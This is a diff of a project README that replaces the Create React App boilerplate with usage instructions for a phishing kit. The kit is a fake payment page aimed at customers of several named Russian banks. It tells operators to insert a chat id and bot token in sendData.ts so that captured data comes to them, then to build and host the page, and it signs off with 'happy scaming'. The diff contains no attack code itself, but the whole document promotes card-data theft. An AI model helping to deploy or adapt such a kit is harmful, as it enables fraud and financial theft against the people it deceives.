@@ -1,70 +1,34 @@
-# Getting Started with Create React App
+# A great merchant on React and Typescript for your phishing
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+I hope this script will help you, if you have any problems - create an issue
 
-## Available Scripts
+## How to use
 
-In the project directory, you can run:
+1) Download the project
+2) Edit web for yourself
+3) insert your chat id and bot token for logs in `sendData.ts`
+3) `npm start` for test or `npm run build` for production
+4) upload the  files from build/ to hosting
+5) happy scaming ^_^
 
-### `npm start`
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+### How it looks
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+![image](https://user-images.githubusercontent.com/98378363/231260694-14cf0cae-5e6d-4dee-b774-8de8efd10d49.png)
+![image](https://user-images.githubusercontent.com/98378363/231260969-4ca92191-833e-4177-b5df-9fa080d33494.png)
+![image](https://user-images.githubusercontent.com/98378363/231261230-a6346718-260f-4ffe-bfdf-0088a82095c7.png)
 
-### `npm test`
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
 
-### `npm run build`
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+https://user-images.githubusercontent.com/98378363/231261927-84804087-e3e7-4beb-92a5-ec1f7555825b.mp4
 
-### `npm run eject`
+### Unpleasant features
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
+1) now supports only 6 banks for pretty card preview (sberbank, tinkoff, alfabank, russian standart bank, sovkonbank, gazprombank)
+2) only desktop adaptive
+3) bank preview can loads too long(bad bin checker api)
 
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
-
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
-
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
-
-## Learn More
-
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
-
-To learn React, check out the [React documentation](https://reactjs.org/).
-
-### Code Splitting
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
-
-### Analyzing the Bundle Size
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
-
-### Making a Progressive Web App
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
-
-### Advanced Configuration
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
-
-### Deployment
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
-
-### `npm run build` fails to minify
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+*I'll fix it soon
